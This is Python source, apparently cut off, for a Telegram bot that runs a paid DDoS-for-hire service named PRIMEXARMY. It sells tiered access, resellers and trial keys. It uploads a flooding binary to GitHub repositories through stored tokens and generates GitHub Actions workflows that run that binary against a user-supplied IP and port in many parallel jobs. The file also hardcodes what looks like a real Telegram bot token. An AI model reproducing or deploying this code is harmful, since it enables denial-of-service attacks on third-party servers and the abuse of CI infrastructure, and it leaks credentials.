import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github, GithubException


logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8594216898:AAF5Tk6tgVYVPrPZabVWHI9yq4DxdkU9LJg"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "primexarmy"
BINARY_STORAGE_PATH = "stored_binary.bin"
ADMIN_IDS = [7820814565, 7820814565]

# Conversation states
WAITING_FOR_BINARY = 1
WAITING_FOR_BROADCAST = 2
WAITING_FOR_ATTACK_IP = 7
WAITING_FOR_ATTACK_PORT = 8
WAITING_FOR_ATTACK_TIME = 9
WAITING_FOR_ADD_USER_ID = 10
WAITING_FOR_ADD_USER_DAYS = 11
WAITING_FOR_REMOVE_USER_ID = 12
WAITING_FOR_TRIAL_HOURS = 13
WAITING_FOR_OWNER_ADD_ID = 14
WAITING_FOR_OWNER_ADD_USERNAME = 15
WAITING_FOR_OWNER_REMOVE_ID = 16
WAITING_FOR_RESELLER_ADD_ID = 17
WAITING_FOR_RESELLER_ADD_CREDITS = 18
WAITING_FOR_RESELLER_ADD_USERNAME = 19
WAITING_FOR_RESELLER_REMOVE_ID = 20
WAITING_FOR_TOKEN_ADD = 21
WAITING_FOR_TOKEN_REMOVE = 22

# Attack management
current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}

# Temporary storage for multi-step operations
temp_data = {}

USER_PRICES = {
    "1": 120,
    "2": 240,
    "3": 360,
    "4": 450,
    "7": 650
}

RESELLER_PRICES = {
    "1": 150,
    "2": 250,
    "3": 300,
    "4": 400,
    "7": 550
}


def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            if not users_data:
                initial_users = ADMIN_IDS.copy()
                save_users(initial_users)
                return set(initial_users)
            return set(users_data)
    except FileNotFoundError:
        initial_users = ADMIN_IDS.copy()
        save_users(initial_users)
        return set(initial_users)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f)

def load_pending_users():
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_groups():
    try:
        with open('groups.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_groups(groups):
    with open('groups.json', 'w') as f:
        json.dump(groups, f, indent=2)

def load_resellers():
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_github_tokens():
    try:
        with open('github_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_github_tokens(tokens):
    with open('github_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_attack_state():
    try:
        with open('attack_state.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"current_attack": None, "cooldown_until": 0}

def save_attack_state():
    state = {
        "current_attack": current_attack,
        "cooldown_until": cooldown_until
    }
    with open('attack_state.json', 'w') as f:
        json.dump(state, f, indent=2)

def load_maintenance_mode():
    try:
        with open('maintenance.json', 'r') as f:
            data = json.load(f)
            return data.get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f, indent=2)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 40)
    except FileNotFoundError:
        return 40

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_max_attacks():
    try:
        with open('max_attacks.json', 'r') as f:
            data = json.load(f)
            return data.get("max_attacks", 1)
    except FileNotFoundError:
        return 1

def save_max_attacks(max_attacks):
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": max_attacks}, f, indent=2)

def load_trial_keys():
    try:
        with open('trial_keys.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_trial_keys(keys):
    with open('trial_keys.json', 'w') as f:
        json.dump(keys, f, indent=2)

def load_user_attack_counts():
    try:
        with open('user_attack_counts.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_user_attack_counts(counts):
    with open('user_attack_counts.json', 'w') as f:
        json.dump(counts, f, indent=2)

def save_binary_file(binary_content):
    """Save binary file content to disk for later use"""
    try:
        with open(BINARY_STORAGE_PATH, 'wb') as f:
            f.write(binary_content)
        logger.info("✅ Binary file saved to storage")
        return True
    except Exception as e:
        logger.error(f"❌ Error saving binary file: {e}")
        return False

def load_binary_file():
    """Load saved binary file content"""
    try:
        if os.path.exists(BINARY_STORAGE_PATH):
            with open(BINARY_STORAGE_PATH, 'rb') as f:
                return f.read()
        return None
    except Exception as e:
        logger.error(f"❌ Error loading binary file: {e}")
        return None

def upload_binary_to_repo(token_data, binary_content):
    """Upload binary file to a specific repository"""
    try:
        g = Github(token_data['token'])
        repo = g.get_repo(token_data['repo'])

        try:
            existing_file = repo.get_contents(BINARY_FILE_NAME)
            repo.update_file(
                BINARY_FILE_NAME,
                "Update binary file",
                binary_content,
                existing_file.sha,
                branch="main"
            )
            logger.info(f"✅ Updated binary in {token_data['repo']}")
            return True, "Updated"
        except:
            repo.create_file(
                BINARY_FILE_NAME,
                "Upload binary file",
                binary_content,
                branch="main"
            )
            logger.info(f"✅ Created binary in {token_data['repo']}")
            return True, "Created"
    except Exception as e:
        logger.error(f"❌ Error uploading binary to {token_data['repo']}: {e}")
        return False, str(e)

# Load all data
authorized_users = load_users()
pending_users = load_pending_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
groups = load_groups()
resellers = load_resellers()
github_tokens = load_github_tokens()
MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()
user_attack_counts = load_user_attack_counts()
trial_keys = load_trial_keys()

attack_state = load_attack_state()
current_attack = attack_state.get("current_attack")
cooldown_until = attack_state.get("cooldown_until", 0)


def is_primary_owner(user_id):
    user_id_str = str(user_id)
    if user_id_str in owners:
        return owners[user_id_str].get("is_primary", False)
    return False

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry_timestamp = approved_users[user_id_str]['expiry']
        if expiry_timestamp == "LIFETIME":
            return True
        current_time = time.time()
        if current_time < expiry_timestamp:
            return True
        else:
            del approved_users[user_id_str]
            save_approved_users(approved_users)
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def can_start_attack(user_id):
    global current_attack, cooldown_until

    if MAINTENANCE_MODE:
        return False, "⚠️ **MAINTENANCE MODE**\n━━━━━━━━━━━━━━━━━━━━━━\nBot is under maintenance. Please wait."

    user_id_str = str(user_id)
    current_count = user_attack_counts.get(user_id_str, 0)
    if current_count >= MAX_ATTACKS:
        return False, f"⚠️ **MAXIMUM ATTACK LIMIT REACHED**\n━━━━━━━━━━━━━━━━━━━━━━\nYou have used all {MAX_ATTACKS} attack(s). Contact admin for more."

    if current_attack is not None:
        return False, "⚠️ **ERROR: ATTACK ALREADY RUNNING**\n━━━━━━━━━━━━━━━━━━━━━━\nPlease wait until the current attack finishes."

    current_time = time.time()
    if current_time < cooldown_until:
        remaining_time = int(cooldown_until - current_time)
        return False, f"⏳ **COOLDOWN REMAINING**\n━━━━━━━━━━━━━━━━━━━━━━\nPlease wait {remaining_time} seconds before starting new attack."

    return True, "✅ Ready to start attack"

def get_attack_method(ip):
    if ip.startswith('91'):
        return "VC FLOOD", "GAME"
    elif ip.startswith(('15', '96')):
        return None, "⚠️ Invalid IP - IPs starting with '15' or '96' are not allowed"
    else:
        return "BGMI FLOOD", "GAME"

def is_valid_ip(ip):
    return not ip.startswith(('15', '96'))

def start_attack(ip, port, time_val, user_id, method):
    global current_attack
    current_attack = {
        "ip": ip,
        "port": port,
        "time": time_val,
        "user_id": user_id,
        "method": method,
        "start_time": time.time(),
        "estimated_end_time": time.time() + int(time_val)
    }
    save_attack_state()

    user_id_str = str(user_id)
    user_attack_counts[user_id_str] = user_attack_counts.get(user_id_str, 0) + 1
    save_user_attack_counts(user_attack_counts)

def finish_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def stop_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def get_attack_status():
    global current_attack, cooldown_until

    if current_attack is not None:
        current_time = time.time()
        elapsed = int(current_time - current_attack['start_time'])
        remaining = max(0, int(current_attack['estimated_end_time'] - current_time))

        return {
            "status": "running",
            "attack": current_attack,
            "elapsed": elapsed,
            "remaining": remaining
        }

    current_time = time.time()
    if current_time < cooldown_until:
        remaining_cooldown = int(cooldown_until - current_time)
        return {
            "status": "cooldown",
            "remaining_cooldown": remaining_cooldown
        }

    return {"status": "ready"}


def generate_trial_key(hours):
    key = f"TRL-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
    expiry = time.time() + (hours * 3600)

    trial_keys[key] = {
        "hours": hours,
        "expiry": expiry,
        "used": False,
        "used_by": None,
        "created_at": time.time(),
        "created_by": "system"
    }
    save_trial_keys(trial_keys)

    return key

def redeem_trial_key(key, user_id):
    user_id_str = str(user_id)

    if key not in trial_keys:
        return False, "Invalid key"

    key_data = trial_keys[key]

    if key_data["used"]:
        return False, "Key already used"

    if time.time() > key_data["expiry"]:
        return False, "Key expired"

    key_data["used"] = True
    key_data["used_by"] = user_id_str
    key_data["used_at"] = time.time()
    trial_keys[key] = key_data
    save_trial_keys(trial_keys)

    expiry = time.time() + (key_data["hours"] * 3600)
    approved_users[user_id_str] = {
        "username": f"user_{user_id}",
        "added_by": "trial_key",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": key_data["hours"] / 24,
        "trial": True
    }
    save_approved_users(approved_users)

    return True, f"✅ Trial access activated for {key_data['hours']} hours!"


def create_repository(token, repo_name="primexarmy-tg"):
    try:
        g = Github(token)
        user = g.get_user()

        try:
            repo = user.get_repo(repo_name)
            return repo, False
        except GithubException:
            repo = user.create_repo(
                repo_name,
                description="PRIMEXARMY DDOS Bot Repository",
                private=False,
                auto_init=False
            )
            return repo, True
    except Exception as e:
        raise Exception(f"Failed to create repository: {e}")

def update_yml_file(token, repo_name, ip, port, time_val, method):
    yml_content = f"""name: primexarmy fucker
on: [push]

jobs:

  stage-0:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5]
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x primexarmy
      - run: ./primexarmy {ip} {port} 10 400

  stage-1:
    needs: stage-0
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5]
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x primexarmy
      - run: ./primexarmy {ip} {port} {time_val} 400

  stage-2-calc:
    runs-on: ubuntu-latest
    outputs:
      matrix_list: ${{{{ steps.calc.outputs.matrix_list }}}}
    steps:
      - id: calc
        run: |
          
          NUM_JOBS=$(({time_val} / 10))
          
          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT

  stage-2-sequential:
    needs: [stage-0, stage-2-calc]
    runs-on: ubuntu-22.04
    strategy:
      max-parallel: 1
      matrix:
        iteration: ${{{{ fromJson(needs.stage-2-calc.outputs.matrix_list) }}}}
    steps:
      - uses: actions/checkout@v3
      - name: Sequential 10s Burst
        run: |
          chmod +x primexarmy
          ./primexarmy {ip} {port} 10 400
"""

    try:
        g = Github(token)
        repo = g.get_repo(repo_name)

        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(
                YML_FILE_PATH,
                f"Update attack parameters - {ip}:{port} ({method})",
                yml_content,
                file_content.sha
            )
            logger.info(f"✅ Updated configuration for {repo_name}")
        except:
            repo.create_file(
                YML_FILE_PATH,
                f"Create attack parameters - {ip}:{port} ({method})",
                yml_content
            )
            logger.info(f"✅ Created configuration for {repo_name}")

        return True
    except Exception as e:
        logger.error(f"❌ Error for {repo_name}: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)

        running_statuses = ['queued', 'in_progress', 'pending']
        total_cancelled = 0

        for status in running_statuses:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                        logger.info(f"✅ INSTANT STOP: Cancelled {status} workflow {workflow.id} for {repo_name}")
                    except Exception as e:
                        logger.error(f"❌ Error cancelling workflow {workflow.id}: {e}")
            except Exception as e:
                logger.error(f"❌ Error getting {status} workflows: {e}")

        return total_cancelled

    except Exception as e:
        logger.error(f"❌ Error accessing {repo_name}: {e}")
        return 0




def get_main_keyboard(user_id):
    """Generate main keyboard based on user role"""
    keyboard = []

    

    keyboard.append([KeyboardButton("🎯 Launch Attack"), KeyboardButton("📊 Check Status")])
    keyboard.append([KeyboardButton("🛑 Stop Attack"), KeyboardButton("🔐 My Access")])

   
    if is_owner(user_id) or is_admin(user_id):
        keyboard.append([KeyboardButton("👥 User Management"), KeyboardButton("⚙️ Bot Settings")])

 
    if is_owner(user_id):
        keyboard.append([KeyboardButton("👑 Owner Panel"), KeyboardButton("🔑 Token Management")])

    keyboard.append([KeyboardButton("❓ Help")])

    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_user_management_keyboard():
    """User management keyboard"""
    keyboard = [
        [KeyboardButton("➕ Add User"), KeyboardButton("➖ Remove User")],
        [KeyboardButton("📋 Users List"), KeyboardButton("⏳ Pending Requests")],
        [KeyboardButton("🔑 Generate Trial Key"), KeyboardButton("💰 Price List")],
        [KeyboardButton("« Back to Main Menu")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_owner_panel_keyboard():
    """Owner panel keyboard"""
    keyboard = [
        [KeyboardButton("👑 Add Owner"), KeyboardButton("🗑️ Remove Owner")],
        [KeyboardButton("💰 Add Reseller"), KeyboardButton("🗑️ Remove Reseller")],
        [KeyboardButton("📋 Owners List"), KeyboardButton("💰 Resellers List")],
        [KeyboardButton("📢 Broadcast Message"), KeyboardButton("📤 Upload Binary")],
        [KeyboardButton("« Back to Main Menu")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_bot_settings_keyboard():
    """Bot settings keyboard"""
    keyboard = [
        [KeyboardButton("🔧 Toggle Maintenance"), KeyboardButton("⏱️ Set Cooldown")],
        [KeyboardButton("🎯 Set Max Attacks"), KeyboardButton("📋 Admin List")],
        [KeyboardButton("« Back to Main Menu")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_token_management_keyboard():
    """Token management keyboard"""
    keyboard = [
        [KeyboardButton("➕ Add Token"), KeyboardButton("📋 List Tokens")],
        [KeyboardButton("🗑️ Remove Token"), KeyboardButton("🧹 Remove Expired")],
        [KeyboardButton("« Back to Main Menu")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_cancel_keyboard():
    """Cancel keyboard"""
    keyboard = [[KeyboardButton("❌ Cancel")]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)




async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if MAINTENANCE_MODE and not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🔧 **MAINTENANCE MODE**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Bot is under maintenance.\n"
            "Please wait until it's back."
        )
        return

    if not can_user_attack(user_id):
        user_exists = False
        for user in pending_users:
            if str(user['user_id']) == str(user_id):
                user_exists = True
                break

        if not user_exists:
            pending_users.append({
                "user_id": user_id,
                "username": update.effective_user.username or f"user_{user_id}",
                "request_date": time.strftime("%Y-%m-%d %H:%M:%S")
            })
            save_pending_users(pending_users)

            for owner_id in owners.keys():
                try:
                    await context.bot.send_message(
                        chat_id=int(owner_id),
                        text=f"📥 **NEW ACCESS REQUEST**\n━━━━━━━━━━━━━━━━━━━━━━\nUser: @{update.effective_user.username or 'No username'}\nID: `{user_id}`\nUse User Management to approve"
                    )
                except:
                    pass

        await update.message.reply_text(
            "📋 **ACCESS REQUEST SENT**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Your access request has been sent to admin.\n"
            "Please wait for approval.\n\n"
            f"Your User ID: `{user_id}`\n\n"
            "💡 **Want a trial?**\n"
            "Ask admin for a trial key"
        )
        return

    
    if is_owner(user_id):
        if is_primary_owner(user_id):
            user_role = "👑 PRIMARY OWNER"
        else:
            user_role = "👑 OWNER"
    elif is_admin(user_id):
        user_role = "🛡️ ADMIN"
    elif is_reseller(user_id):
        user_role = "💰 RESELLER"
    else:
        user_role = "👤 APPROVED USER"

    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks

    attack_status = get_attack_status()
    status_text = ""

    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        status_text = f"\n\n🔥 **ACTIVE ATTACK**\nTarget: `{attack['ip']}:{attack['port']}`\nRemaining: `{attack_status['remaining']}s`"
    elif attack_status["status"] == "cooldown":
        status_text = f"\n\n⏳ **COOLDOWN**: `{attack_status['remaining_cooldown']}s`"

    message = (
        f"🤖 **WELCOME TO THE BOT** 🤖\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{user_role}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎯 **Remaining Attacks:** {remaining_attacks}/{MAX_ATTACKS}\n"
        f"📊 **Status:** {'🟢 Ready' if attack_status['status'] == 'ready' else '🔴 Busy'}"
        f"{status_text}\n\n"
        f"Use the buttons below to navigate:"
    )

    reply_markup = get_main_keyboard(user_id)
    await update.message.reply_text(message, reply_markup=reply_markup)




async def handle_button_press(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    
    if text == "« Back to Main Menu":
        await show_main_menu(update, user_id)

    
    elif text == "🎯 Launch Attack":
        await launch_attack_start(update, context, user_id)
    elif text == "📊 Check Status":
        await check_status(update, user_id)
    elif text == "🛑 Stop Attack":
        await stop_attack_handler(update, context, user_id)
    elif text == "🔐 My Access":
        await my_access(update, user_id)


    elif text == "👥 User Management":
        await show_user_management(update, user_id)
    elif text == "➕ Add User":
        await add_user_start(update, user_id)
    elif text == "➖ Remove User":
        await remove_user_start(update, user_id)
    elif text == "📋 Users List":
        await users_list(update, user_id)
    elif text == "⏳ Pending Requests":
        await pending_requests(update, user_id)
    elif text == "🔑 Generate Trial Key":
        await gen_trial_key_start(update, user_id)
    elif text == "💰 Price List":
        await price_list(update)

    
    elif text == "⚙️ Bot Settings":
        await show_bot_settings(update, user_id)
    elif text == "🔧 Toggle Maintenance":
        await toggle_maintenance(update, user_id)
    elif text == "⏱️ Set Cooldown":
        await set_cooldown_start(update, user_id)
    elif text == "🎯 Set Max Attacks":
        await set_max_attacks_start(update, user_id)
    elif text == "📋 Admin List":
        await admin_list(update, user_id)

   
    elif text == "👑 Owner Panel":
        await show_owner_panel(update, user_id)
    elif text == "👑 Add Owner":
        await add_owner_start(update, user_id)
    elif text == "🗑️ Remove Owner":
        await remove_owner_start(update, user_id)
    elif text == "💰 Add Reseller":
        await add_reseller_start(update, user_id)
    elif text == "🗑️ Remove Reseller":
        await remove_reseller_start(update, user_id)
    elif text == "📋 Owners List":
        await owner_list(update, user_id)
    elif text == "💰 Resellers List":
        await reseller_list(update, user_id)
    elif text == "📢 Broadcast Message":
        await broadcast_start(update, user_id)
    elif text == "📤 Upload Binary":
        await upload_binary_start(update, user_id)

  
    elif text == "🔑 Token Management":
        await show_token_management(update, user_id)
    elif text == "➕ Add Token":
        await add_token_start(update, user_id)
    elif text == "📋 List Tokens":
        await list_tokens(update, user_id)
    elif text == "🗑️ Remove Token":
        await remove_token_start(update, user_id)
    elif text == "🧹 Remove Expired":
        await remove_expired_tokens(update, user_id)

    
    elif text == "❓ Help":
        await help_handler(update, user_id)

   
    elif text == "❌ Cancel":
        # Clear temp data
        if user_id in temp_data:
            del temp_data[user_id]
        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text("❌ **OPERATION CANCELLED**", reply_markup=reply_markup)

   
    else:
        await handle_text_input(update, context, user_id, text)



async def show_main_menu(update: Update, user_id):
    if is_owner(user_id):
        if is_primary_owner(user_id):
            user_role = "👑 PRIMARY OWNER"
        else:
            user_role = "👑 OWNER"
    elif is_admin(user_id):
        user_role = "🛡️ ADMIN"
    elif is_reseller(user_id):
        user_role = "💰 RESELLER"
    else:
        user_role = "👤 APPROVED USER"

    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks

    attack_status = get_attack_status()
    status_text = ""

    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        status_text = f"\n\n🔥 **ACTIVE ATTACK**\nTarget: `{attack['ip']}:{attack['port']}`\nRemaining: `{attack_status['remaining']}s`"
    elif attack_status["status"] == "cooldown":
        status_text = f"\n\n⏳ **COOLDOWN**: `{attack_status['remaining_cooldown']}s`"

    message = (
        f"🤖 **MAIN MENU** 🤖\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{user_role}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎯 **Remaining Attacks:** {remaining_attacks}/{MAX_ATTACKS}\n"
        f"📊 **Status:** {'🟢 Ready' if attack_status['status'] == 'ready' else '🔴 Busy'}"
        f"{status_text}\n\n"
        f"Use the buttons below:"
    )

    reply_markup = get_main_keyboard(user_id)
    await update.message.reply_text(message, reply_markup=reply_markup)

async def show_user_management(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    message = (
        "👥 **USER MANAGEMENT**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Manage users, approvals, and trial keys\n\n"
        "Select an option below:"
    )

    reply_markup = get_user_management_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)

async def show_bot_settings(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    message = (
        "⚙️ **BOT SETTINGS**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}\n"
        f"⏱️ Cooldown: {COOLDOWN_DURATION}s\n"
        f"🎯 Max Attacks: {MAX_ATTACKS}\n\n"
        "Select an option below:"
    )

    reply_markup = get_bot_settings_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)

async def show_owner_panel(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    message = (
        "👑 **OWNER PANEL**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Owner-only management options\n\n"
        "Select an option below:"
    )

    reply_markup = get_owner_panel_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)

async def show_token_management(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    message = (
        "🔑 **TOKEN MANAGEMENT**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Total Servers: {len(github_tokens)}\n\n"
        "Select an option below:"
    )

    reply_markup = get_token_management_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)




async def launch_attack_start(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**\nYou are not authorized to attack.")
        return

    can_start, message = can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(message)
        return

    if not github_tokens:
        await update.message.reply_text("❌ **NO SERVERS AVAILABLE**\nNo servers available. Contact admin.")
        return

    temp_data[user_id] = {"step": "attack_ip"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "🎯 **LAUNCH ATTACK - STEP 1/3**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Please send the target IP address:\n\n"
        "Example: `192.168.1.1`\n\n"
        "⚠️ IPs starting with '15' or '96' are not allowed",
        reply_markup=reply_markup
    )

async def check_status(update: Update, user_id):
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    attack_status = get_attack_status()

    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        message = (
            "🔥 **ATTACK RUNNING**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 Target: `{attack['ip']}:{attack['port']}`\n"
            f"⏱️ Elapsed: `{attack_status['elapsed']}s`\n"
            f"⏳ Remaining: `{attack_status['remaining']}s`\n"
            f"⚡ Method: `{attack['method']}`"
        )
    elif attack_status["status"] == "cooldown":
        message = (
            "⏳ **COOLDOWN**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Remaining: `{attack_status['remaining_cooldown']}s`\n"
            f"⏰ Next attack in: `{attack_status['remaining_cooldown']}s`"
        )
    else:
        message = (
            "✅ **READY**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "No attack running.\n"
            "You can start a new attack."
        )

    await update.message.reply_text(message)

async def stop_attack_handler(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    attack_status = get_attack_status()

    if attack_status["status"] != "running":
        await update.message.reply_text("❌ **NO ACTIVE ATTACK**\nNo attack is running.")
        return

    if not github_tokens:
        await update.message.reply_text("❌ **NO SERVERS AVAILABLE**")
        return

    await update.message.reply_text("🛑 **STOPPING ATTACK...**")

    total_stopped = 0
    success_count = 0

    threads = []
    results = []

    def stop_single_token(token_data):
        try:
            stopped = instant_stop_all_jobs(
                token_data['token'],
                token_data['repo']
            )
            results.append((token_data['username'], stopped))
        except Exception as e:
            results.append((token_data['username'], 0))

    for token_data in github_tokens:
        thread = threading.Thread(target=stop_single_token, args=(token_data,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    for username, stopped in results:
        total_stopped += stopped
        if stopped > 0:
            success_count += 1

    stop_attack()

    message = (
        f"🛑 **ATTACK STOPPED**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Workflows cancelled: {total_stopped}\n"
        f"✅ Servers: {success_count}/{len(github_tokens)}\n"
        f"⏳ Cooldown: {COOLDOWN_DURATION}s"
    )

    await update.message.reply_text(message)

async def my_access(update: Update, user_id):
    if is_owner(user_id):
        if is_primary_owner(user_id):
            role = "👑 PRIMARY OWNER"
        else:
            role = "👑 OWNER"
        expiry = "LIFETIME"
    elif is_admin(user_id):
        role = "🛡️ ADMIN"
        expiry = "LIFETIME"
    elif is_reseller(user_id):
        role = "💰 RESELLER"
        reseller_data = resellers.get(str(user_id), {})
        expiry = reseller_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "EXPIRED"
                else:
                    expiry_date = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                    expiry = expiry_date
            except:
                pass
    elif is_approved_user(user_id):
        role = "👤 APPROVED USER"
        user_data = approved_users.get(str(user_id), {})
        expiry = user_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "EXPIRED"
                else:
                    expiry_date = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                    expiry = expiry_date
            except:
                pass
    else:
        role = "⏳ PENDING"
        expiry = "Waiting for approval"

    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks

    message = (
        f"🔐 **YOUR ACCESS INFO**\n"
